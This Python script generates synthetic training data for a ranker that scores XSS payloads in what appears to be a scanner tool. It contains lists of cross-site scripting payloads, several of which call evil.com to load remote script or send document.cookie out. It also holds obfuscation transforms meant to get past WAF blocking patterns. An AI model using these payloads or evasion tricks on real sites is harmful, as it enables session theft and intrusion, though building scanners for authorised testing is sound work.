"""
generate_ranker_data — generates synthetic training data for XGBoost ranker
bootstraps the model before real scan execution data is collected
uses heuristic rules and payload characteristics to simulate execution outcomes
"""

import json
import logging
import os
import random
import re
from pathlib import Path
from typing import Any

import sys
sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "modules" / "payload-gen-module"))

from feature_extractor import CONTEXT_LABELS, WAF_TYPES, TECHNIQUE_TYPES

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("generate_ranker_data")

DATASET_DIR = Path(__file__).parent / "dataset" / "splits"
OUTPUT_DIR = Path(__file__).parent / "dataset" / "ranker_training"
OUTPUT_FILE = OUTPUT_DIR / "ranker_training_samples.jsonl"

# sample payloads representing different categories
PAYLOAD_TEMPLATES = {
    "script_injection": [
        '<script>alert(1)</script>',
        '<script>alert(document.domain)</script>',
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script src=//evil.com/xss.js></script>',
        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
    ],
    "event_handler": [
        '<img src=x onerror=alert(1)>',
        '<img/src=x onerror=alert(1)//>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
    ],
    "js_uri": [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'data:text/html,<script>alert(1)</script>',
        'javascript:void(document.location="http://evil.com")',
        'javascript:confirm(1)',
    ],
    "tag_injection": [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
    ],
    "attribute": [
        '" onerror=alert(1) x="',
        "' onerror=alert(1) x='",
        '" onload=alert(1) x="',
        '" onfocus=alert(1) autofocus="',
        "' onmouseover=alert(1) '",
        '"><img src=x onerror=alert(1)>',
        "' ><img src=x onerror=alert(1)>",
    ],
    "template_injection": [
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        '{{7*7}}',
        '#{alert(1)}',
        '<%= alert(1) %>',
    ],
    "dom_sink": [
        'document.write("<img src=x onerror=alert(1)>")',
        'document.body.innerHTML="<img src=x onerror=alert(1)>"',
        'eval("alert(1)")',
        'setTimeout("alert(1)",0)',
        'location="javascript:alert(1)"',
    ],
    "attribute_escape": [
        '\\" onerror=alert(1)//',
        "\\' onerror=alert(1)//",
        '\\"><img src=x onerror=alert(1)>',
        "&quot; onerror=alert(1) x=&quot;",
    ],
}

# obfuscation patterns
OBFUSCATION_TRANSFORMS = {
    "unicode_escape": lambda s: s.replace("a", "\\u0061").replace("l", "\\u006c"),
    "hex_escape": lambda s: s.replace("<", "\\x3c").replace(">", "\\x3e"),
    "html_entity": lambda s: s.replace("<", "&lt;").replace(">", "&gt;"),
    "url_encode": lambda s: s.replace("<", "%3C").replace(">", "%3E"),
    "mixed_case": lambda s: "".join(c.upper() if i % 2 else c for i, c in enumerate(s)),
    "tab_newline_inject": lambda s: s.replace("(", "(\t").replace("=", "\n="),
    "comment_inject": lambda s: s.replace("script", "scr/**/ipt") if "script" in s.lower() else s,
    "concat_split": lambda s: s.replace("alert", "al"+"'+'ert"),
}

# WAFs and their typical blocking patterns
WAF_BLOCKS = {
    "none": [],
    "cloudflare": ["<script>", "onerror=", "javascript:"],
    "modsecurity": ["<script", "alert(", "document."],
    "aws_waf": ["<script>", "eval(", "onerror"],
    "akamai": ["<script", "on\\w+=", "javascript:"],
    "imperva": ["<script", "alert", "onerror"],
    "wordfence": ["<script>", "</script>", "onerror"],
    "sucuri": ["<script", "alert(", "onerror="],
    "f5": ["<script", "document.cookie", "eval("],
}

# context → success boost (some contexts are easier to exploit)
CONTEXT_SUCCESS_RATES = {
    "script_injection": 0.70,
    "event_handler": 0.65,
    "js_uri": 0.55,
    "tag_injection": 0.60,
    "attribute": 0.50,
    "template_injection": 0.35,
    "dom_sink": 0.40,
    "attribute_escape": 0.30,
}


def _is_blocked_by_waf(payload: str, waf: str) -> bool:
    """Simulate WAF blocking based on pattern matching."""
    patterns = WAF_BLOCKS.get(waf, [])
    for pattern in patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    return False


def _simulate_execution(
    payload: str,
    context: str,
    technique: str,
    waf: str,
) -> bool:
    """
    Simulate whether a payload would successfully execute.
    Uses heuristic rules to generate realistic training labels.
    """
    base_rate = CONTEXT_SUCCESS_RATES.get(context, 0.5)
    
    # WAF reduces success
    if waf != "none" and _is_blocked_by_waf(payload, waf):
        base_rate *= 0.15
    
    # obfuscation can help bypass WAF
    if technique.startswith("obfuscated:") and waf != "none":
        base_rate *= 1.4
    
    # original payloads are more likely to work
    if technique == "original":
        base_rate *= 1.1
    
    # auto-triggering payloads are more likely to execute
    if re.search(r"onerror|onload|<script", payload, re.IGNORECASE):
        base_rate *= 1.2
    
    # very long payloads are less likely to work
    if len(payload) > 300:
        base_rate *= 0.6
    
    # very short payloads may be incomplete
    if len(payload) < 15:
        base_rate *= 0.7
    
    # context-payload mismatch reduces success
    if context == "attribute" and "<script>" in payload.lower():
        base_rate *= 0.4  # need to break out of attribute first
    
    if context == "script_injection" and "onerror=" in payload.lower():
        base_rate *= 0.6  # event handlers work better in HTML context
    
    # html entity encoded payloads never execute
    if "&lt;" in payload or "&gt;" in payload:
        base_rate *= 0.05
    
    # url encoded payloads in non-URL contexts rarely work
    if "%3C" in payload and context not in {"js_uri", "attribute"}:
        base_rate *= 0.3
    
    base_rate = min(base_rate, 0.95)
    return random.random() < base_rate


def generate_samples(n_samples: int = 5000) -> list[dict]:
    """
    Generate synthetic training samples.
    """
    samples = []
    
    for _ in range(n_samples):
        # pick random context
        context = random.choice(CONTEXT_LABELS)
        
        # pick random WAF
        waf = random.choice(WAF_TYPES)
        
        # pick base payload (prefer context-matched but sometimes mismatch)
        if random.random() < 0.7:
            # context-matched payload
            templates = PAYLOAD_TEMPLATES.get(context, PAYLOAD_TEMPLATES["event_handler"])
        else:
            # random context payload (to learn mismatches)
            random_ctx = random.choice(list(PAYLOAD_TEMPLATES.keys()))
            templates = PAYLOAD_TEMPLATES[random_ctx]
        
        payload = random.choice(templates)
        
        # apply technique
        if random.random() < 0.4:
            technique = "original"
        elif random.random() < 0.5:
            technique = "mutated"
            # simple mutation: swap tags/events
            mutations = [
                lambda p: p.replace("alert", "confirm"),
                lambda p: p.replace("img", "svg"),
                lambda p: p.replace("onerror", "onload"),
                lambda p: p.replace("script", "SCRIPT"),
            ]
            mutation = random.choice(mutations)
            payload = mutation(payload)
        else:
            # obfuscate
            obf_type = random.choice(list(OBFUSCATION_TRANSFORMS.keys()))
            technique = f"obfuscated:{obf_type}"
            transform = OBFUSCATION_TRANSFORMS[obf_type]
            try:
                payload = transform(payload)
            except Exception:
                pass
        
        # severity
        severity = random.choice(["high", "medium", "low"])
        
        # simulate execution
        executed = _simulate_execution(payload, context, technique, waf)
        reflected = executed or (random.random() < 0.6)  # reflected more often than executed
        exact_match = reflected and (random.random() < 0.7)
        dialog_triggered = executed and (random.random() < 0.8)
        
        # reflection position (correlated with context)
        if context in {"script_injection", "tag_injection"}:
            position = random.choice(["html_body", "script"])
        elif context == "attribute":
            position = "attribute"
        elif context == "dom_sink":
            position = random.choice(["script", "none"])
        else:
            position = random.choice(["html_body", "attribute", "script", "style", "none"])
        
        # allowed chars (simulate char fuzzer output)
        all_special = list("<>'\"/\\()=;{}[]`|&!@#$%^*~?")
        if random.random() < 0.3:
            # restricted charset
            allowed_chars = random.sample(all_special, random.randint(3, 10))
        else:
            allowed_chars = all_special
        
        # determine success label
        dangerous_positions = {"html_body", "script", "attribute", "style"}
        success = executed or (reflected and exact_match and position in dangerous_positions)
        
        sample = {
            "timestamp": "2026-03-03T00:00:00",
            "url": f"https://example.com/page{random.randint(1,100)}",
            "payload_text": payload,
            "target_param": random.choice(["q", "search", "name", "input", "value", "id", "msg", "comment"]),
            "context": context,
            "waf": waf if waf != "none" else None,
            "technique": technique,
            "severity": severity,
            "allowed_chars": allowed_chars,
            "executed": executed,
            "dialog_triggered": dialog_triggered,
            "reflected": reflected,
            "exact_match": exact_match,
            "reflection_position": position,
            "success": success,
        }
        
        samples.append(sample)
    
    return samples


def main():
    """Generate synthetic training data and write to JSONL file."""
    random.seed(42)
    
    n_samples = int(os.environ.get("N_SAMPLES", "5000"))
    logger.info(f"Generating {n_samples} synthetic training samples...")
    
    samples = generate_samples(n_samples)
    
    # compute stats
    success_count = sum(1 for s in samples if s["success"])
    logger.info(
        f"Generated {len(samples)} samples: "
        f"{success_count} success ({success_count/len(samples)*100:.1f}%), "
        f"{len(samples) - success_count} failure"
    )
    
    # write to JSONL
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w") as f:
        for sample in samples:
            f.write(json.dumps(sample) + "\n")
    
    logger.info(f"Written to {OUTPUT_FILE}")
    
    # print context distribution
    from collections import Counter
    ctx_dist = Counter(s["context"] for s in samples)
    logger.info("Context distribution:")
    for ctx, count in ctx_dist.most_common():
        ctx_success = sum(1 for s in samples if s["context"] == ctx and s["success"])
        logger.info(f"  {ctx}: {count} samples, {ctx_success/count*100:.1f}% success")


if __name__ == "__main__":
    main()
